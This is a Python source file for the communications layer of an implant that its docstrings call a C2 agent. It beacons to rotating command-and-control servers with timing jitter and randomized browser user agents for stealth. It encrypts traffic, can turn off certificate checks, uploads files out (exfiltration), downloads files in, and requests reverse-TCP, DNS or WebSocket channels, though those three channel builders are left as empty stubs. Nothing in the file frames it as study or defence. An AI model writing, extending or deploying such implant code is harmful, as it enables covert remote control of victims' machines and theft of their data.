# agent/core/communications.py
import json
import time
import random
import urllib.request
import urllib.parse
import urllib.error
import ssl
from typing import Dict, Any, Optional, List
from datetime import datetime


class CommunicationManager:
    """Handles all communications with C2 server"""
    
    def __init__(self, agent):
        self.agent = agent
        self.config = agent.config
        self.crypto = agent.crypto
        self.current_server_index = 0
        self.failed_attempts = 0
        
        # Create SSL context
        self.ssl_context = ssl.create_default_context()
        if self.config.debug:
            # Disable SSL verification for testing
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE
    
    def get_current_server(self) -> str:
        """Get current C2 server URL"""
        servers = self.config.c2_servers + self.config.backup_servers
        if not servers:
            raise Exception("No C2 servers configured")
        
        return servers[self.current_server_index % len(servers)]
    
    def rotate_server(self):
        """Rotate to next C2 server"""
        servers = self.config.c2_servers + self.config.backup_servers
        self.current_server_index = (self.current_server_index + 1) % len(servers)
        self.failed_attempts = 0
    
    def send_data(self, data: Dict[str, Any], endpoint: str = "/api/agent") -> Optional[Dict[str, Any]]:
        """Send data to C2 server"""
        # Add jitter to check-in interval
        if hasattr(self, '_last_checkin'):
            jitter = random.uniform(-self.config.checkin_jitter, self.config.checkin_jitter)
            jitter_seconds = self.config.checkin_interval * jitter
            time.sleep(max(0, jitter_seconds))
        
        # Prepare data
        data['agent_id'] = self.agent.agent_id
        data['timestamp'] = datetime.utcnow().isoformat()
        
        # Encrypt if enabled
        if self.config.encryption_enabled:
            if self.agent.session_key:
                # Use session key if available
                payload = {
                    'encrypted': True,
                    'session': True,
                    'data': self.crypto.encrypt_session(data)
                }
            else:
                # Use default encryption
                payload = {
                    'encrypted': True,
                    'session': False,
                    'data': self.crypto.encrypt_data(data)
                }
        else:
            payload = data
        
        # Try to send data
        for attempt in range(self.config.max_retries):
            try:
                response = self._make_request(endpoint, payload)
                self.failed_attempts = 0
                self._last_checkin = time.time()
                return response
                
            except Exception as e:
                if self.config.debug:
                    print(f"Communication attempt {attempt + 1} failed: {e}")
                
                self.failed_attempts += 1
                
                if attempt < self.config.max_retries - 1:
                    time.sleep(self.config.retry_delay * (attempt + 1))
                else:
                    # Max retries reached, try rotating server
                    self.rotate_server()
        
        return None
    
    def _make_request(self, endpoint: str, data: Dict[str, Any]) -> Dict[str, Any]:
        """Make HTTP request to C2 server"""
        url = self.get_current_server() + endpoint
        
        # Prepare request
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': self._get_user_agent(),
        }
        
        if self.agent.session_key:
            headers['X-Session-ID'] = self.agent.agent_id
        
        # Convert data to JSON
        json_data = json.dumps(data).encode('utf-8')
        
        # Create request
        request = urllib.request.Request(
            url,
            data=json_data,
            headers=headers,
            method='POST'
        )
        
        # Configure proxy if needed
        if self.config.use_proxy and self.config.proxy_url:
            proxy_handler = urllib.request.ProxyHandler({
                'http': self.config.proxy_url,
                'https': self.config.proxy_url
            })
            
            if self.config.proxy_auth:
                proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
                proxy_auth_handler.add_password(
                    realm=None,
                    uri=self.config.proxy_url,
                    user=self.config.proxy_auth['username'],
                    passwd=self.config.proxy_auth['password']
                )
                opener = urllib.request.build_opener(proxy_handler, proxy_auth_handler)
            else:
                opener = urllib.request.build_opener(proxy_handler)
            
            urllib.request.install_opener(opener)
        
        # Make request
        try:
            response = urllib.request.urlopen(
                request,
                context=self.ssl_context,
                timeout=30
            )
            
            # Read response
            response_data = response.read().decode('utf-8')
            response_json = json.loads(response_data)
            
            # Decrypt if needed
            if response_json.get('encrypted'):
                if response_json.get('session') and self.agent.session_key:
                    decrypted = self.crypto.decrypt_session(response_json['data'])
                else:
                    decrypted = self.crypto.decrypt_data(response_json['data'])
                
                return decrypted if isinstance(decrypted, dict) else {'data': decrypted}
            
            return response_json
            
        except urllib.error.HTTPError as e:
            if e.code == 404:
                raise Exception("Agent not found on server")
            elif e.code == 401:
                raise Exception("Authentication failed")
            else:
                raise Exception(f"HTTP error {e.code}: {e.reason}")
        except urllib.error.URLError as e:
            raise Exception(f"Connection failed: {e.reason}")
        except json.JSONDecodeError:
            raise Exception("Invalid response from server")
    
    def _get_user_agent(self) -> str:
        """Get randomized user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
        ]
        return random.choice(user_agents)
    
    def download_file(self, file_id: str) -> Optional[bytes]:
        """Download file from C2 server"""
        try:
            data = {
                'action': 'download',
                'file_id': file_id
            }
            
            response = self.send_data(data, endpoint="/api/agent/files")
            
            if response and response.get('status') == 'success':
                # Decode base64 file content
                file_data = response.get('data')
                if file_data:
                    import base64
                    return base64.b64decode(file_data)
            
            return None
            
        except Exception as e:
            if self.config.debug:
                print(f"File download failed: {e}")
            return None
    
    def upload_file(self, filename: str, file_data: bytes) -> bool:
        """Upload file to C2 server"""
        try:
            import base64
            
            data = {
                'action': 'upload',
                'filename': filename,
                'data': base64.b64encode(file_data).decode('utf-8'),
                'size': len(file_data)
            }
            
            response = self.send_data(data, endpoint="/api/agent/files")
            
            return response and response.get('status') == 'success'
            
        except Exception as e:
            if self.config.debug:
                print(f"File upload failed: {e}")
            return False
    
    def establish_channel(self, channel_type: str = "reverse_tcp") -> Optional[Any]:
        """Establish alternative communication channel"""
        try:
            data = {
                'action': 'establish_channel',
                'channel_type': channel_type
            }
            
            response = self.send_data(data, endpoint="/api/agent/channel")
            
            if response and response.get('status') == 'success':
                channel_config = response.get('config')
                
                if channel_type == "reverse_tcp":
                    return self._create_tcp_channel(channel_config)
                elif channel_type == "dns":
                    return self._create_dns_channel(channel_config)
                elif channel_type == "websocket":
                    return self._create_websocket_channel(channel_config)
            
            return None
            
        except Exception as e:
            if self.config.debug:
                print(f"Channel establishment failed: {e}")
            return None
    
    def _create_tcp_channel(self, config: Dict[str, Any]):
        """Create TCP reverse channel"""
        # Implementation would go here
        pass
    
    def _create_dns_channel(self, config: Dict[str, Any]):
        """Create DNS channel"""
        # Implementation would go here
        pass
    
    def _create_websocket_channel(self, config: Dict[str, Any]):
        """Create WebSocket channel"""
        # Implementation would go here
        pass
